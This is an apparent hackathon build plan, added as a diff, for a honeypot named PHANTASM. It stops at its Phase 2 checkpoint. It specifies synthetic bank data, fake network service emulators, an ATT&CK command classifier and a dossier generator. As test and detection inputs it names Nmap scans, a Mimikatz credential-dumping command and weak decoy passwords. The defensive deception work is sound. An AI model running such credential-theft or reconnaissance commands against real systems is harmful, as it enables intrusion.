@@ -1,0 +1,1286 @@
+================================================================================
+                    PHANTASM — IMPLEMENTATION PLAN
+         Proactive Honeypot with Adaptive Network Topology
+                   and Attacker Signature Mapping
+         5-Phase Build Strategy | SIH 2026 | VIT Vellore
+         Classification: INTERNAL — TEAM USE ONLY
+================================================================================
+
+  "The attacker has nothing. We have everything."
+
+  This document is the ground-level execution blueprint. It translates the
+  PRD, TRD, database schema, UI/UX spec, and website flow into a sequenced,
+  parallelised, member-assigned build plan with explicit entry conditions,
+  exit criteria, and integration checkpoints at every phase boundary.
+
+  READ THE TRD BEFORE THIS DOCUMENT.
+  This plan references TRD component names and section numbers directly.
+  If TRD language and this plan diverge: the TRD wins on technical detail;
+  this plan wins on scheduling and sequencing decisions.
+
+================================================================================
+OVERVIEW — THE 5 PHASES
+================================================================================
+
+  PHASE 1  —  FOUNDATION (Infrastructure + Scaffold)
+  PHASE 2  —  CORE ENGINES (ShadowMesh + MirrorTrap independently)
+  PHASE 3  —  INTELLIGENCE LAYER (Feedback Loop + Dossier Engine)
+  PHASE 4  —  SURFACE LAYER (API Server + React Dashboard)
+  PHASE 5  —  INTEGRATION, HARDENING, AND DEMO REHEARSAL
+
+  Phase structure rationale: Phases 1–2 have ZERO component interdependency —
+  both ShadowMesh and MirrorTrap can be built simultaneously from day one.
+  Phase 3 requires Phase 2 outputs but can be partially built in parallel.
+  Phase 4 (frontend) can begin scaffolding from Phase 1 completion. Phase 5 is
+  non-negotiable convergence time — no new features, only integration and fixes.
+
+  Estimated Total Duration: 22–24 hours (hackathon sprint, 5 members active)
+  Phase 5 must begin no later than Hour 19. This is a hard rule.
+
+================================================================================
+PHASE 1 — FOUNDATION
+Hours 0–3 | All Members | Parallel Execution
+================================================================================
+
+1.0 OBJECTIVE
+─────────────
+Stand up the complete development environment, initialise all storage layers,
+generate the base synthetic data pool, confirm all tooling installs correctly
+on the demo hardware, and establish the shared Redis message bus. No component
+logic is written in Phase 1 — only infrastructure. Phase 1 is complete when
+every member can independently push to their assigned component and see Redis,
+SQLite, and the shadowmesh0 interface all operational.
+
+1.1 ENVIRONMENT SETUP (Member 3 — Integration Lead, All Members present)
+────────────────────────────────────────────────────────────────────────────
+
+  Step 1 — System package installation (run as root):
+    apt update && apt install -y python3.11 python3.11-venv python3.11-dev \
+      libnetfilter-queue-dev libpango-1.0-0 libpangoft2-1.0-0 \
+      libharfbuzz0b libffi-dev docker.io docker-compose tmux nmap ldap-utils
+
+  Step 2 — Python virtual environment:
+    python3.11 -m venv ~/phantasm/venv
+    source ~/phantasm/venv/bin/activate
+    pip install -r backend/requirements.txt
+    (requirements.txt: exact pinned versions from TRD Section 30.3)
+
+  Step 3 — Node.js environment:
+    cd frontend && npm install (package.json from TRD Section 30.3)
+    Confirm: npm run dev starts without error on port 3000
+
+  Step 4 — Docker + Redis:
+    docker-compose up -d
+    Verify: redis-cli -h 127.0.0.1 -p 6379 PING → returns PONG
+    BLOCKER if this fails: check Docker daemon running, port 6379 not in use
+
+  Step 5 — Virtual network interface:
+    sudo ip link add shadowmesh0 type dummy
+    sudo ip link set shadowmesh0 up
+    sudo ip addr add 192.168.10.1/24 dev shadowmesh0
+    sudo ip addr add 192.168.20.1/24 dev shadowmesh0
+    sudo ip addr add 192.168.30.1/24 dev shadowmesh0
+    sudo iptables -I INPUT -i shadowmesh0 -j NFQUEUE --queue-num 1
+    sudo iptables -I FORWARD -i shadowmesh0 -j NFQUEUE --queue-num 1
+    Verify: ip addr show shadowmesh0 shows all three /24 addresses
+
+  Step 6 — .env file creation:
+    Create /backend/.env with all fields from TRD Section 30.1.
+    Obtain ANTHROPIC_API_KEY before Phase 1 begins. No exceptions.
+    Create /frontend/.env.local with VITE_API_URL and VITE_WS_URL.
+
+1.2 DATABASE INITIALISATION (Member 4 — Dossier/DB Lead)
+──────────────────────────────────────────────────────────
+
+  Deliverable: backend/db/schema.py + backend/db/migrations.py
+
+  schema.py — contains all 14 CREATE TABLE statements as Python string
+  constants, exactly as specified in the PHANTASM Database Schema document.
+  Table order matters for FK constraints:
+    1. topology_snapshots
+    2. sessions
+    3. fake_hosts
+    4. synthetic_data_objects
+    5. ad_synthetic_users
+    6. db_synthetic_records
+    7. commands
+    8. command_techniques
+    9. operator_profiles
+    10. host_interactions
+    11. iocs
+    12. topology_mutations
+    13. stress_timeline
+    14. dossiers
+    15. (operator_fingerprints — stub table, no FK deps, add last)
+
+  migrations.py — async main() that:
+    - Opens aiosqlite connection to SQLITE_DB_PATH
+    - Sets PRAGMA journal_mode=WAL; synchronous=NORMAL; cache_size=-64000; foreign_keys=ON
+    - Executes all CREATE TABLE IF NOT EXISTS statements from schema.py
+    - Creates all named indices
+    - Calls PRAGMA integrity_check to verify
+    - Logs success of each table creation
+
+  Run: python backend/db/migrations.py
+  Exit criteria: phantasm.db exists, `sqlite3 phantasm.db .tables` returns all 14 tables.
+
+1.3 SYNTHETIC DATA BOOTSTRAP (Member 4, continued)
+────────────────────────────────────────────────────
+
+  Deliverable: backend/db/init_synthetic.py
+
+  This script populates the base synthetic pool before any session begins.
+  It does NOT need to be fast — it runs once during setup, not at runtime.
+
+  Implement in this order:
+
+  STEP A — Faker initialisation:
+    from faker import Faker
+    fake = Faker('en_IN')
+    import random, hashlib, json
+
+  STEP B — Synthetic AD user generation (100 users):
+    Departments pool: ['Core Banking Operations', 'IT Infrastructure',
+      'SWIFT Operations', 'HR & Administration', 'Risk & Compliance',
+      'Finance & Accounts', 'Network Operations', 'Helpdesk']
+    Generate 100 users with:
+      - sam_account_name: f"{fake.last_name().lower()}.{fake.first_name().lower()}"
+        (max 20 chars, truncate if needed)
+      - display_name: fake.name()
+      - user_principal_name: f"{sam_account_name}@{PHANTASM_DOMAIN}"
+      - employee_id: f"EMP-{random.randint(2018,2024)}-{random.randint(10000,99999)}"
+      - title: random from department-appropriate title pool
+      - last_logon: fake.date_time_between(start_date='-30d', end_date='now').isoformat()
+      - password_last_set: fake.date_time_between(start_date='-90d', end_date='-7d')
+      - is_privileged: TRUE for 10 users (indices 0-9)
+      - is_service_account: TRUE for 5 users (indices 0-4, named svc_*)
+      - password_hash_ntlm: hashlib.md5(f"{session_id}{sam}PHANTASM_SYNTHETIC_SALT"
+          .encode()).hexdigest()  — session_id = "BOOTSTRAP" for pre-session pool
+      - password_plaintext_fake: random from ['P@ssw0rd123','BankName@2024',
+          'Admin@2024!','Welcome@1','India@2026']
+    Write all 100 users to ad_synthetic_users via aiosqlite INSERT.
+    Write parent synthetic_data_objects rows (object_type='ad_user', session_fk=NULL).
+
+  STEP C — Synthetic DB records (250 base rows):
+    customer_accounts (100 rows):
+      account_no: 11-digit string (random.randint)
+      customer_name: fake.name()
+      dob: fake.date_of_birth(minimum_age=21, maximum_age=65)
+      mobile: f"9{random.randint(100000000, 999999999)}"
+      email: fake.email()
+      account_type: random from ['SAVINGS', 'CURRENT', 'SALARY', 'NRE', 'FD']
+      balance: f"{random.uniform(5000, 2000000):.2f}"
+      branch_ifsc: f"SBIN{random.randint(1000,9999):04d}"
+      pan: f"{fake.random_uppercase_letter()*5}{random.randint(1000,9999)}{fake.random_uppercase_letter()}"
+      (PAN structure: AAAAA9999A — not a real PAN)
+      kyc_status: 'VERIFIED'
+      last_transaction: fake.date_between(start_date='-7d', end_date='today')
+    Write 100 rows to db_synthetic_records (db_name='FINACLE_PROD',
+      table_name='customer_accounts', host_fk=NULL for bootstrap).
+
+    employees HR (150 rows): same Faker fields adapted for HR context.
+    Write to db_synthetic_records (db_name='HR_SYSTEM', table_name='employees').
+
+  STEP D — Base topology snapshot stub:
+    Create one row in topology_snapshots: snapshot_type='base', session_fk=NULL.
+    (ShadowMesh will populate node_count and topology_json in Phase 2.)
+
+  Run: python backend/db/init_synthetic.py
+  Exit criteria: SELECT COUNT(*) FROM ad_synthetic_users returns 100.
+                 SELECT COUNT(*) FROM db_synthetic_records returns 250.
+
+1.4 MODEL ASSETS AND AI TOOLING (Member 2 — MirrorTrap Lead)
+──────────────────────────────────────────────────────────────
+
+  This step runs in parallel with 1.2 and 1.3.
+
+  Download and stage all model assets to /backend/models/:
+
+  BERT ATT&CK classifier:
+    Option A (recommended): Use a pre-fine-tuned security NLP model.
+      Download: jackaduma/SecBERT or microsoft/codebert-base as base.
+      Fine-tune on MITRE Caldera command logs + DARPA TC dataset if time allows.
+      If no fine-tuning time: use keyword-matching fallback as primary, BERT secondary.
+    Convert to ONNX:
+      pip install optimum
+      optimum-cli export onnx --model {model_dir} --task text-classification \
+        ./backend/models/bert_attack_onnx/
+    Quantise to INT8:
+      from onnxruntime.quantization import quantize_dynamic
+      quantize_dynamic("model.onnx", "model_int8.onnx", weight_type=QuantType.QInt8)
+    Test inference time: must be <500ms on demo hardware before proceeding.
+
+  ATT&CK group vectors (critical for attribution):
+    Download MITRE ATT&CK v14 STIX JSON from GitHub:
+      https://github.com/mitre/cti/raw/master/enterprise-attack/enterprise-attack.json
+    Parse to extract technique→group occurrence matrix.
+    Script: python backend/db/build_attack_vectors.py
+    Output: backend/models/att_ck_vectors/group_vectors.npy (shape: 138×196)
+            backend/models/att_ck_vectors/group_names.json
+            backend/models/att_ck_vectors/technique_ids.json (196 technique IDs, ordered)
+
+  ATT&CK technique keyword map:
+    Parse att&ck_v14.json for detection keywords per technique.
+    Output: backend/models/att_ck_vectors/att_ck_v14.json
+    Used by keyword fallback in mt_classifier.py.
+
+  DistilBERT expertise classifier:
+    Download: distilbert-base-uncased from HuggingFace hub (cached locally).
+    Convert to ONNX (same process as BERT above).
+    This classifier has a much simpler fine-tuning target — 4 classes.
+    If fine-tuning not possible: expertise scoring runs from heuristics only
+    (mt_expertise.py) and DistilBERT is omitted. Acceptable for hackathon.
+
+  DCGAN traffic model:
+    If training not completed: generate a PCAP fallback file.
+    tcpdump -i lo -w backend/models/dcgan_traffic/traffic.pcap -c 10000
+    (Capture 10000 packets of real localhost traffic as base.)
+    pcap_replay.py adjusts timestamps and re-emits. Functionally equivalent.
+
+1.5 PHASE 1 EXIT CRITERIA (all must pass before Phase 2 begins)
+────────────────────────────────────────────────────────────────
+  □ redis-cli PING → PONG
+  □ All 14 SQLite tables exist and pass integrity_check
+  □ ad_synthetic_users has 100 rows, db_synthetic_records has 250 rows
+  □ shadowmesh0 interface up, 3 subnet addresses assigned
+  □ iptables NFQUEUE rule set (verify: iptables -L | grep NFQUEUE)
+  □ BERT ONNX model file exists; test inference on "nmap -sV" < 500ms
+  □ group_vectors.npy loaded without error (np.load and shape verified)
+  □ npm install completes without errors; npm run dev starts React on :3000
+  □ .env file present with ANTHROPIC_API_KEY set
+  □ All team members can activate venv and import key packages without error
+
+
+================================================================================
+PHASE 2 — CORE ENGINES
+Hours 3–12 | Parallel Tracks (5 tracks, 5 members)
+================================================================================
+
+2.0 OBJECTIVE
+─────────────
+Build the two independent functional cores: ShadowMesh (fake network that
+responds to real Nmap scans) and MirrorTrap (ATT&CK classifier that produces
+operator profiles from command streams). These tracks are completely independent
+until the integration checkpoint at Hour 12. Both must reach their milestones
+before Phase 3 begins.
+
+Track assignment:
+  Member 1 → Track A: ShadowMesh (sm_core + service emulators)
+  Member 2 → Track B: MirrorTrap (classifier + profiling engine)
+  Member 3 → Track C: API Server skeleton + FC skeleton (Phase 3 prep)
+  Member 4 → Track D: Dossier engine skeleton (Phase 3 prep)
+  Member 5 → Track E: React scaffold + design system + Zustand store
+
+────────────────────────────────────────────────────────────────────────────────
+TRACK A — SHADOWMESH (Member 1)
+────────────────────────────────────────────────────────────────────────────────
+
+Hours 3–5: sm_topology.py — Topology Generator (NO NFQueue needed yet)
+
+  Class TopologyGenerator:
+    generate_topology(host_count=15, domain=PHANTASM_DOMAIN) → dict
+      - Create host_count Host objects distributed across 3 subnets:
+          user_vlan  (192.168.10.x): workstations (5 hosts)
+          server_vlan (192.168.20.x): web, file, HR servers (5 hosts)
+          mgmt_vlan  (192.168.30.x): DC, DB, payment gateway, SWIFT (5 hosts)
+      - Mandatory role assignments (minimum 1 of each):
+          domain_controller: 192.168.10.31 — dc-auth-prod.{domain}
+          database_server:   192.168.30.11 — finacle-prod-db.{domain}
+          web_server:        192.168.20.10 — web-portal-01.{domain}
+          file_server:       192.168.20.22 — file-srv-01.{domain}
+          payment_gateway:   192.168.30.22 — payment-gw-02.{domain}
+          hr_system:         192.168.20.31 — hr-sys-01.{domain}
+          backup_server:     192.168.20.40 — backup-srv-01.{domain}
+          swift_interface:   192.168.30.33 — swift-int-01.{domain} (is_crown_jewel=TRUE)
+      - OS assignments per role (Windows for all except Linux for web/proxy):
+          domain_controller: 'Windows Server 2019 Standard', ttl=128, tcp_window=65535
+          database_server:   'Windows Server 2019 Standard', ttl=128
+          web_server:        'Ubuntu Server 20.04 LTS', ttl=64, tcp_window=29200
+          workstations:      'Windows 10 Enterprise 21H2', ttl=128
+      - Services JSON per host — match TRD Section 6:
+          DC: [53/tcp dns, 88/tcp kerberos, 389/tcp ldap, 445/tcp smb, 636/tcp ldaps]
+          DB: [1433/tcp mssql]
+          Web: [80/tcp http, 443/tcp https]
+          File: [445/tcp smb, 139/tcp netbios]
+          HR: [80/tcp http, 443/tcp https, 8080/tcp http-alt]
+          Payment GW: [443/tcp https, 8443/tcp https-alt]
+      - Latency baselines: server=1.8ms±30%, workstation=5.2ms±30%, appliance=0.8ms±30%
+      - Build edges list: DC→all servers (ldap_auth), servers→DC (kerberos)
+
+    save_to_db() → topology_snapshot_pk (writes to topology_snapshots + fake_hosts)
+    get_topology_json() → dict (serialised topology, matches TRD Section 5.4 format)
+
+  Test: python -c "from sm_topology import TopologyGenerator; t=TopologyGenerator();
+        t.generate_topology(); print(len(t.hosts), 'hosts generated')"
+  Pass: prints 15 (or configured count)
+
+Hours 5–9: sm_core.py — NFQueue Hook + Service Dispatch
+
+  NFQueue integration:
+    import nfqueue
+    from scapy.all import IP, TCP, UDP, Raw
+
+    q = nfqueue.queue()
+    q.open()
+    q.bind(socket.AF_INET)
+    q.set_callback(packet_handler)
+    q.fast_open(NFQUEUE_QUEUE_NUM, socket.AF_INET)
+    q.try_run()
+
+  packet_handler(payload):
+    data = payload.get_data()
+    pkt = IP(data)
+    dst_ip = pkt.dst
+    dst_port = pkt[TCP].dport if TCP in pkt else (pkt[UDP].dport if UDP in pkt else None)
+
+    host = topology.get_host_by_ip(dst_ip)  # O(1) dict lookup
+    if host is None:
+      payload.set_verdict(nfqueue.NF_DROP)
+      return
+
+    # Apply latency jitter
+    baseline = host.latency_baseline_ms
+    jitter = random.gauss(baseline, baseline * host.latency_jitter_pct)
+    time.sleep(max(0, jitter) / 1000.0)
+
+    # Dispatch to service emulator
+    response = service_registry.dispatch(host, pkt)
+    if response:
+      # Craft response packet with Scapy and re-inject
+      # Swap src/dst, set correct TTL
+      resp_pkt = craft_response(pkt, response, host)
+      send(resp_pkt, verbose=0)
+      payload.set_verdict(nfqueue.NF_DROP)  # We handle it manually
+    else:
+      payload.set_verdict(nfqueue.NF_ACCEPT)
+
+    # Publish event to Redis
+    event = build_event(pkt, host, response)
+    redis_client.publish("sm:events", json.dumps(event))
+
+  Also: subscribe to "sm:mutations" channel. On mutation message:
+    - Parse nodes_to_add from mutation JSON
+    - Call topology.add_nodes(nodes_to_add)
+    - Confirm with topology REST endpoint update
+    - Publish "topology_updated" event to Redis
+
+  REST API on :8001:
+    GET /topology → returns topology.get_topology_json()
+    GET /topology/nodes → list of fake_hosts records
+    POST /topology/mutate → accepts mutation directive (backup path from FC)
+
+  Test: sudo python sm_core.py in one terminal, then in another:
+        nmap -sV 192.168.10.31
+        Expected: Port 389, 445, 53, 88, 636 visible. No "honeypot" warning.
+
+Hours 9–12: Service Emulators (sm_services/)
+
+  Build in priority order (most critical for demo first):
+
+  PRIORITY 1 — ssh_emulator.py:
+    Banners per OS (hardcoded dict keyed by declared_os):
+      Windows: "SSH-2.0-OpenSSH_for_Windows_8.6\r\n"
+      Ubuntu:  "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\r\n"
+    On connection: send banner, then SSH_MSG_KEXINIT packet.
+    On auth attempt: accept any credential silently.
+    After auth: enter fake_shell mode — capture all typed lines as commands.
+    Publish every command line as Redis "sm:events" event.
+
+  PRIORITY 2 — http_emulator.py:
+    TLS: load self-signed cert from synthetic_data_objects for this host.
+    HTTP/1.1 200 OK response with role-appropriate HTML body:
+      web_server: fake bank login page (HDFC-styled, no real logo)
+      hr_system: SAP-like "Enterprise Portal" login form
+      payment_gateway: 403 Forbidden (nginx header)
+    Server header matched to declared OS.
+
+  PRIORITY 3 — smb_emulator.py:
+    SMB2 negotiate response (Windows Server 2019 capabilities).
+    NTLM auth: always return STATUS_SUCCESS.
+    Tree connect: return STATUS_SUCCESS for any UNC path.
+    Share enum: return role-appropriate share list (see TRD Section 6.3).
+    File listing: generate on-the-fly from Faker (filenames from TRD Section 6.3).
+    Log every share access to host_interactions.
+
+  PRIORITY 4 — ldap_emulator.py + ad_emulator.py:
+    Anonymous bind: always succeed.
+    User search: return rows from ad_synthetic_users.
+    Computer search: return rows from fake_hosts.
+    Group search: return hardcoded synthetic group list.
+    Kerberos (port 88): AS-REQ → AS-REP with fake TGT (random 32 bytes).
+    Mimikatz detection: if "sekurlsa::logonpasswords" in command_text:
+      Return fake Mimikatz output with 5-10 users from ad_synthetic_users.
+      Mark was_dumped=TRUE for those users.
+
+  PRIORITY 5 — db_emulator.py:
+    MSSQL TDS banner on 1433.
+    SQL auth: accept any credential.
+    SELECT queries: return rows from db_synthetic_records for this host.
+    If insufficient rows: call synthetic generator on-the-fly (async, 2s budget).
+    Log every query to host_interactions (data_access_attempted=TRUE).
+
+  PRIORITY 6 (if time permits) — rdp_emulator.py, ftp_emulator.py:
+    RDP: X.224 Connection Confirm + NLA prompt (credential accepted, no session).
+    FTP: 220 banner + PASV + LIST returning fake filenames.
+
+  TRACK A MILESTONE (must achieve by Hour 12):
+    ✓ nmap -sV -O 192.168.10.0/24 shows all 15 hosts
+    ✓ OS fingerprints match declared types (no "honeypot" in Nmap output)
+    ✓ nc 192.168.10.31 389 returns LDAP rootDSE data
+    ✓ SSH connection to any host accepts any credential and enters fake shell
+    ✓ Commands typed in fake shell appear in Redis "sm:events" channel
+
+────────────────────────────────────────────────────────────────────────────────
+TRACK B — MIRRORTRAP (Member 2)
+────────────────────────────────────────────────────────────────────────────────
+
+Hours 3–6: mt_classifier.py — ONNX Inference Wrapper
+
+  class ATTACKClassifier:
+    __init__(model_path, label_map_path, keyword_map_path):
+      self.ort_session = ort.InferenceSession(model_path,
+        providers=['CPUExecutionProvider'])
+      self.tokenizer = AutoTokenizer.from_pretrained(tokenizer_path)
+      with open(label_map_path) as f: self.label_map = json.load(f)
+      with open(keyword_map_path) as f: self.keyword_map = json.load(f)
+
+    classify(command_text: str) → List[TechniqueResult]:
+      # Normalise
+      text = command_text.lower().strip()[:512]
+
+      # ONNX inference path
+      try:
+        inputs = self.tokenizer(text, return_tensors="np", padding=True,
+                                truncation=True, max_length=128)
+        start = time.time()
+        logits = self.ort_session.run(None, {
+          "input_ids": inputs["input_ids"],
+          "attention_mask": inputs["attention_mask"]
+        })[0][0]
+        inference_ms = (time.time() - start) * 1000
+        log_perf(inference_ms)  # Track in performance.log
+
+        probs = 1 / (1 + np.exp(-logits))  # Sigmoid
+        results = []
+        for i, prob in enumerate(probs):
+          if prob > 0.5:  # Primary threshold
+            results.append(TechniqueResult(
+              technique_id=self.label_map[str(i)],
+              confidence=float(prob), is_primary=True))
+          elif prob > 0.3:  # Secondary threshold
+            results.append(TechniqueResult(
+              technique_id=self.label_map[str(i)],
+              confidence=float(prob), is_primary=False))
+
+        if results: return results
+
+      except Exception as e:
+        logger.warning(f"ONNX inference failed: {e}. Falling back to keywords.")
+
+      # Keyword fallback — always runs if ONNX returns nothing or fails
+      return self._keyword_classify(text)
+
+    _keyword_classify(text) → List[TechniqueResult]:
+      results = []
+      for technique_id, keywords in self.keyword_map.items():
+        for kw in keywords:
+          if kw in text:
+            results.append(TechniqueResult(
+              technique_id=technique_id, confidence=0.65, is_primary=True))
+            break
+      return results or [TechniqueResult("UNKNOWN", 0.0, False)]
+
+  Unit test:
+    classifier = ATTACKClassifier(...)
+    result = classifier.classify("nmap -sV -O 192.168.10.0/24")
+    assert result[0].technique_id == "T1046"
+    print(f"Inference: {inference_ms:.1f}ms")  # Must be <500ms
+
+Hours 6–9: mt_expertise.py + mt_timing.py + mt_attribution.py
+
+  mt_expertise.py — ExpertiseScorer:
+    Maintain running score (only ever increases within session).
+    score_command(command_text, technique_results) → (score_delta, new_total):
+      Apply all 4 scoring signal categories (TRD Section 8.4):
+        command_complexity_score = count_pipes*5 + count_flags*3 + subshell*10 +
+                                   redirection*3 + base64_detected*15
+        tool_sophistication_score: map command prefix to tool tier (TRD Section 8.4)
+        sequencing_score: track last 5 techniques and check for logical progression
+        privesc_speed_score: track how quickly first privesc attempt occurs
+      weighted_delta = (0.30*cmd + 0.30*tool + 0.20*seq + 0.20*privesc)
+      Update running total.
+    get_level(score) → ('script_kiddie'|'intermediate'|'advanced'|'apt_grade', score):
+      Threshold map from TRD Section 8.4: 0/25/50/75
+
+  mt_timing.py — TimingAnalyser:
+    Maintain deque(maxlen=20) of ICI values.
+    update(new_ici_ms) → operational_state:
+      ici_window.append(new_ici_ms)
+      mean_ici = statistics.mean(ici_window)
+      stddev = statistics.stdev(ici_window) if len > 1 else 0
+      trend = float(np.polyfit(range(len(ici_window)), list(ici_window), 1)[0])
+      (state logic from TRD Section 8.6)
+    is_stress_event(prev_ici, new_ici) → (bool, annotation_str):
+      return (prev_ici > 8000 and new_ici < 3000,
+              f"Stress onset — cadence +{((prev_ici/new_ici)-1)*100:.0f}%")
+
+  mt_attribution.py — AttributionScorer:
+    __init__: load group_vectors.npy and group_names.json on init.
+    score(technique_id_list) → List[GroupMatch]:
+      Build session_vector from technique_id_list (count-normalised).
+      scores = cosine_similarity(session_vector.reshape(1,-1), self.group_vectors)
+      top5 = sorted indices by score descending, take top 5.
+      return [GroupMatch(group_id, name, score) for each of top5]
+
+Hours 9–12: mt_engine.py — Integration + Redis Pipeline
+
+  Main async process:
+    - Subscribe to Redis "sm:events"
+    - Maintain in-memory profile state: {session_id → ProfileState}
+    - On each command event:
+        1. Compute ICI (ms since previous command for this session)
+        2. Run ATTACKClassifier.classify(command_text) → techniques
+        3. Run ExpertiseScorer.score_command() → expertise update
+        4. Run TimingAnalyser.update(ici_ms) → operational_state
+        5. Check is_stress_event() → flag command if stress trigger
+        6. Every 5th command: run AttributionScorer.score() → attribution
+        7. Build profile_update dict from all current state
+        8. Publish to "mt:profile" channel
+        9. Write command + techniques to SQLite (via async queue to flush worker)
+        10. Write stress_timeline row if stress_state != 'normal'
+        11. Write operator_profiles row every 5 commands
+
+  Flush worker (background coroutine, runs every 5 seconds):
+    Drains write queue, performs batch aiosqlite inserts.
+    Handles WAL checkpoint after session ends.
+
+  TRACK B MILESTONE (must achieve by Hour 12):
+    ✓ Redis PUBLISH sm:events '{"type":"command","raw_command":"nmap -sV 192.168.10.0/24","session_id":"TEST-01","seq":1,"ici_ms":null}'
+    ✓ mt_engine processes it, classifies T1046, publishes to mt:profile within 500ms
+    ✓ After running 20-command test sequence from PRD Appendix A:
+        expertise_level = 'advanced' or 'apt_grade'
+        primary_objective populated
+        top_apt_group populated
+    ✓ Commands and techniques written to SQLite (verify with sqlite3 queries)
+
+────────────────────────────────────────────────────────────────────────────────
+TRACK C — API SERVER SKELETON (Member 3)
+────────────────────────────────────────────────────────────────────────────────
+
+Hours 3–8: api_server.py scaffold + fc_controller.py structure
+
+  api_server.py:
+    FastAPI app + python-socketio AsyncServer (TRD Section 12.2).
+    Implement all REST endpoints (TRD Section 12.3) — they can return stubs
+    or test data while ShadowMesh and MirrorTrap build in parallel.
+    Implement WebSocket bridge: subscribe to "phantasm:dashboard" Redis channel,
+    forward every message to all connected Socket.io clients.
+    Implement "request_snapshot" Socket.io event handler:
+      On this event: read current session state from Redis, emit full state dump.
+
+  fc_controller.py:
+    Subscribe to "mt:profile" channel.
+    Implement trigger conditions (fc_triggers.py) — all 4 from TRD:
+      T1: expertise_level == 'apt_grade'                 → 'materialise_crown_jewel'
+      T2: objective_score['data_exfiltration'] > 0.65    → 'add_swift_node'
+      T3: credential_technique_count >= 3                → (no mutation, just flag)
+      T4: ransomware pattern (T1490 observed)            → 'expose_smb_share'
+    Rate limiter: before ANY mutation, check Redis key mutation:rate_limit:{session_id}.
+      If key exists: queue mutation for after TTL (120s). Do NOT drop.
+      If key absent: SET mutation:rate_limit:{session_id} TTL 120, proceed.
+    On mutation decision: PUBLISH "sm:mutations" with mutation directive JSON.
+    Write topology_mutations row to SQLite.
+
+  session_mgr.py:
+    start_session() → session_id: creates sessions row, sets Redis session state.
+    end_session(session_id): marks session ended in SQLite + Redis, calls de_engine.
+
+  TRACK C MILESTONE (Hour 12):
+    ✓ GET http://localhost:8000/api/health returns 200 with all component statuses
+    ✓ Socket.io connect from browser dev console succeeds
+    ✓ Manual Redis PUBLISH to "mt:profile" flows through to Socket.io client
+    ✓ fc_controller triggers correctly on injected test profiles
+
+────────────────────────────────────────────────────────────────────────────────
+TRACK D — DOSSIER ENGINE SKELETON (Member 4)
+────────────────────────────────────────────────────────────────────────────────
+
+Hours 3–8: de_prompt.py + Claude API + dossier.html.j2 template
+
+  de_prompt.py:
+    build_user_prompt(structured_data: dict) → str:
+      Formats the complete LLM prompt per TRD Section 11.3.
+      structured_data is the result of dossier aggregation queries.
+      JSON embedded as compact single-line string (json.dumps(data, separators=(',',':')))
+    SYSTEM_PROMPT: hardcoded string from PRD Section 7.2.
+
+  de_engine.py — Claude API call (aiohttp async):
+    async call_llm(session_id, structured_data) → str:
+      user_prompt = build_user_prompt(structured_data)
+      async with aiohttp.ClientSession() as session:
+        async with session.post(
+          "https://api.anthropic.com/v1/messages",
+          headers={"x-api-key": ANTHROPIC_API_KEY,
+                   "anthropic-version": "2023-06-01",
+                   "content-type": "application/json"},
+          json={"model": "claude-sonnet-4-6", "max_tokens": 600,
+                "messages": [{"role":"user","content":user_prompt}],
+                "system": SYSTEM_PROMPT},
+          timeout=aiohttp.ClientTimeout(total=30)
+        ) as resp:
+          data = await resp.json()
+          narrative = data["content"][0]["text"]
+          if len(narrative) < 100:
+            raise ValueError("Narrative too short")
+          return narrative
+      # On any exception: return load_cached_narrative()
+
+  dossier.html.j2 template:
+    Build complete Jinja2 HTML template per UI/UX spec Section 7 (PDF design).
+    Sections in order: header (PHANTASM wordmark, CONFIDENTIAL, session ID, amber rule),
+    session overview table, operator profile table, technique table (amber ATT&CK IDs),
+    IOC box (red left border), assets accessed table, analyst assessment (LLM narrative,
+    italic, amber-tinted bg), CERT-In MIS fields, footer every page.
+    Pre-download Inter font to /backend/static/fonts/ and reference via @font-face.
+    Test render: HTML(string=sample_html).write_pdf("/tmp/test_dossier.pdf")
+
+  Cached fallback:
+    Generate one high-quality dossier from a fixture session record.
+    Save to /backend/output/cached_dossier.json.
+    If API call fails: load this file and return its narrative field.
+
+  TRACK D MILESTONE (Hour 12):
+    ✓ Claude API call with fixture structured_data returns 400+ word narrative
+    ✓ dossier.html.j2 renders to valid PDF via WeasyPrint (no font errors)
+    ✓ Cached fallback returns in <2 seconds when API key disabled
+
+────────────────────────────────────────────────────────────────────────────────
+TRACK E — REACT FRONTEND SCAFFOLD (Member 5)
+────────────────────────────────────────────────────────────────────────────────
+
+Hours 3–8: Scaffold + Design System + Zustand + WebSocket
+
+  Project setup:
+    npm create vite@5.1.0 phantasm-ui -- --template react
+    Install all packages from TRD Section 30.3 frontend package.json
+    Configure TailwindCSS: tailwind.config.js with content paths.
+
+  src/styles/tokens.css:
+    Define ALL CSS custom properties from UI/UX spec Section 2:
+    backgrounds, amber system, text system, semantic tactic colours, status colours,
+    node colours, shadows/glows, spacing, border/radius.
+    Import in main.jsx BEFORE any component styles.
+    RULE: Zero hardcoded hex values in any component file.
+
+  src/store/sessionStore.js (Zustand):
+    Implement complete store structure from WEBSITE_FLOW doc (React State section):
+    systemStatus, wsConnected, sessionState, sessionId, sessionStart/EndTime,
+    commands (latest 200), commandCount, profile (4 dimensions), nodes, edges,
+    stats (commands/techniques/dwell/engagementScore), iocs, iciHistory (latest 100),
+    dossierStatus, dossierData.
+    All actions: addCommand, updateProfile, addNode, setSessionState, setDossierReady, resetSession.
+
+  src/services/socket.js:
+    io("http://localhost:8000", {reconnectionDelay: 1000, reconnectionDelayMax: 5000})
+    Event handlers (all WebSocket event types from TRD Section 17):
+      "command_classified" → store.addCommand(payload)
+      "profile_update" → store.updateProfile(payload)
+      "topology_mutation" → store.addNode(payload.nodes_added[0], payload.edges)
+      "session_state_change" → store.setSessionState(payload.state)
+      "dossier_ready" → store.setDossierReady(payload)
+      "state_snapshot" → restore full state from snapshot payload
+    On connect: emit "request_snapshot"
+    Connection status → store.set(wsConnected: true/false)
+
+  Basic layout (3-column grid + header + bottom bar):
+    Header: PHANTASM wordmark, session status chip, timer, command counter, buttons
+    Left panel (380px): CommandFeed component (renders commands array from store)
+    Centre panel (flex): NetworkGraph div (D3 target — empty for now)
+    Right panel (360px): OperatorProfile with 4 sub-components
+    Bottom bar (80px): StressChart div + IOC counters
+
+  TRACK E MILESTONE (Hour 12):
+    ✓ React app loads at localhost:3000
+    ✓ Socket.io connects to api_server — wsConnected=true in store
+    ✓ System status dots in header reflect actual service health
+    ✓ Manual Redis PUBLISH to "phantasm:dashboard" shows up in browser console
+    ✓ Basic 3-column layout renders with CSS token colours
+
+2.1 PHASE 2 INTEGRATION CHECKPOINT (Hour 12)
+─────────────────────────────────────────────
+
+  After all 5 tracks reach their milestones:
+
